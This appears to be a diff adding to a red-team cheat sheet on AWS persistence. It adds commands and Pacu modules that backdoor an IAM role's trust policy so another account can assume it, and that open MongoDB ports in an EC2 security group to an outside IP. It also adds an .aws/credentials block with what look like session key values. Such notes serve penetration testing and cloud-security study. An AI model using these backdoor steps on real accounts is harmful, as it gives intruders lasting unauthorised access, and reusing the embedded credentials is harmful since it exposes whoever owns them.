@@ -50,6 +50,24 @@ Update and assume role
 ```
 aws iam update-assume-role-policy --role-name test-role --policy-document file://trust-policy.json --profile Test
 aws sts assume-role --role-arn arn:aws:iam::748384263101:role/test-role --role-session-name PersistenceTest --profile vitquaynonroot
+# Or just use PACU
+run iam__backdoor_assume_role --role-names Admin --user-arns arn:aws:iam::012345678912:root
+```
+Change .aws/credentials file
+```
+[PersistenceTest2]
+aws_access_key_id = ASIA24PZNTO6525L54XY
+aws_secret_access_key = SVbH0B5VKQU9VHUJKSKfqdZZcIThAOfkOgjyH3Cm
+aws_session_token = <SHORTENED>
+```
+
+### Allow port in EC2
+```
+aws ec2 describe-instances --profile Test
+aws ec2 describe-security-groups --group-ids sg-0315cp741b51fr4d0 --profile Test
+aws ec2 authorize-security-group-ingress --group-id sg-0315cp741b51fr4d0 --protocol tcp --port 27017-27018 --cidr 1.1.1.1/32
+# Or using PACU
+run ec2__backdoor_ec2_sec_groups --ip 1.1.1.1/32 --port-range 27017-27018 --protocol tcp --groups corp@us-west-2
 ```
 
 ## EC2
